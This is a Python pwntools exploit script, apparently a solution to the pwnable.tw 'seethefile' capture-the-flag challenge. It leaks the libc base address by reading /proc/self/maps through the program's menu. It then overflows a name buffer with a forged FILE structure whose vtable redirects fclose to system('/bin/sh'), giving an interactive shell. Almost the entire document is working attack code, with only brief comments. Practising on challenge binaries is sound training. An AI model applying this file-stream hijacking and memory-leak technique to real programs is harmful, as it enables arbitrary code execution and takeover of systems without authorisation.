#!/usr/bin/env python3
from pwn import *

# p = remote("chall.pwnable.tw", "10200")
elf = ELF("./vuln")
libc = ELF("./libc.so.6")
context.update(binary=elf, log_level="DEBUG")
p = elf.process()
# gdb.attach(
#     p,
#     """
#         b *main+106
#         b *main+116
#         b *main+126
#         b *main+133
#         b *main+148
#     """,
# )


def openfile(path):
    p.recvuntil(b"choice :")
    p.sendline(b"1")
    p.recvuntil(b"see :")
    p.sendline(path)
    return


def readfile():
    p.recvuntil(b"choice :")
    p.sendline(b"2")
    return


def writefile():
    p.recvuntil(b"choice :")
    p.sendline(b"3")
    leak = p.recvuntil(b"r-xp 00000000")  # libc has permisions execute
    return leak


def closefile():
    p.recvuntil(b"choice :")
    p.sendline(b"4")
    return


### get libc base address
openfile(b"/proc/self/maps")
readfile()
readfile()  # libc's entry appears in the second set of 400 characters:

leak = writefile()
leak = leak.split(b"\n")
leak = leak[-1].split(b"-")
libc.address = int(leak[0].decode(), 16)

log.info("Address LIBC base: " + hex(libc.address))
log.info("Address of system: " + hex(libc.symbols["system"]))

### exploit
file = FileStructure()
file.flags = u32(b"/bin")
file._IO_read_ptr = u32(b"/sh\x00")
file._lock = 0x804BA00
# checking the fp->_lock. Setting the fp->_lock to an address which contains value
file.vtable = 0x804B284 - 0x44

payload = b"A" * 0x20
payload += p32(0x804B290)
payload += p32(libc.symbols["system"])  # __fclose
payload += p32(0) * 2
payload += bytes(file)
p.sendlineafter(b"choice :", b"5")
p.sendlineafter(b"name :", payload)


# p.sendline(b"cd home/seethefile")
# p.sendline(b"./get_flag")
# sleep(0.5)
# p.sendline(b"Give me the flag")
p.interactive()
